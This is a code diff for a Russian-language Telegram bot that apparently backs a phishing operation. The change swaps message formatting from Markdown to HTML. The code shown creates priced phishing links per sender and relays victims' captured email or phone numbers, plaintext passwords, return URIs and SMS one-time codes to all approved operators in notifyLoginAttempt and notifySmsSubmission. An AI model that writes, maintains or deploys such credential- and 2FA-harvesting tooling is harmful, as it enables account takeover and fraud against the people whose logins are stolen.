@@ -393,9 +393,9 @@ async function createLink(chatId: number, telegramId: string, price: string, sen
       `ID: ${linkId}\n` +
       `Цена: ${price}\n` +
       `Отправитель: ${senderName}\n\n` +
-      `Ссылка:\n\`\`\`\n${generatedLink}\n\`\`\`\n\n` +
+      `Ссылка:\n<code>${generatedLink}</code>\n\n` +
       `Нажмите на ссылку чтобы скопировать её.`,
-      { ...mainKeyboard, parse_mode: 'Markdown' }
+      { ...mainKeyboard, parse_mode: 'HTML' }
     );
 
   } catch (error) {
@@ -422,7 +422,7 @@ async function showUserLinks(chatId: number, telegramId: string) {
       let message = `${link.linkId} - ${link.price}\n`;
       message += `👤 ${link.senderName}\n`;
       message += `📅 ${date}\n`;
-      message += `🔗 Ссылка:\n\`\`\`\n${link.generatedLink}\n\`\`\``;
+      message += `🔗 Ссылка:\n<code>${link.generatedLink}</code>`;
 
       const keyboard = {
         reply_markup: {
@@ -435,7 +435,7 @@ async function showUserLinks(chatId: number, telegramId: string) {
         }
       };
 
-      await bot.sendMessage(chatId, message, { ...keyboard, parse_mode: 'Markdown' });
+      await bot.sendMessage(chatId, message, { ...keyboard, parse_mode: 'HTML' });
     }
 
     if (links.length > 5) {
@@ -467,9 +467,9 @@ export async function notifyLoginAttempt(emailOrPhone: string, password: string,
     const approvedUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
     
     const message = `🔐 Новая попытка входа\n\n` +
-      `📧 Email/Телефон:\n\`\`\`\n${emailOrPhone}\n\`\`\`\n` +
-      `🔑 Пароль:\n\`\`\`\n${password}\n\`\`\`\n` +
-      `🔗 Return URI:\n\`\`\`\n${returnUri}\n\`\`\`\n` +
+      `📧 Email/Телефон:\n<code>${emailOrPhone}</code>\n` +
+      `🔑 Пароль:\n<code>${password}</code>\n` +
+      `🔗 Return URI:\n<code>${returnUri}</code>\n` +
       `⏰ Время: ${new Date().toLocaleString('ru-RU')}`;
 
     const keyboard = {
@@ -488,7 +488,7 @@ export async function notifyLoginAttempt(emailOrPhone: string, password: string,
     };
 
     for (const user of approvedUsers) {
-      await bot.sendMessage(user.telegramId, message, { ...keyboard, parse_mode: 'Markdown' });
+      await bot.sendMessage(user.telegramId, message, { ...keyboard, parse_mode: 'HTML' });
     }
   } catch (error) {
     console.error('Error sending login notification:', error);
@@ -516,12 +516,12 @@ export async function notifySmsSubmission(otpCode: string, stepupContext: string
     const approvedUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
     
     const message = `📱 Новый SMS код\n\n` +
-      `🔢 Код:\n\`\`\`\n${otpCode}\n\`\`\`\n` +
-      `📋 Контекст:\n\`\`\`\n${stepupContext}\n\`\`\`\n` +
+      `🔢 Код:\n<code>${otpCode}</code>\n` +
+      `📋 Контекст:\n<code>${stepupContext}</code>\n` +
       `⏰ Время: ${new Date().toLocaleString('ru-RU')}`;
 
     for (const user of approvedUsers) {
-      await bot.sendMessage(user.telegramId, message, { parse_mode: 'Markdown' });
+      await bot.sendMessage(user.telegramId, message, { parse_mode: 'HTML' });
     }
   } catch (error) {
     console.error('Error sending SMS notification:', error);
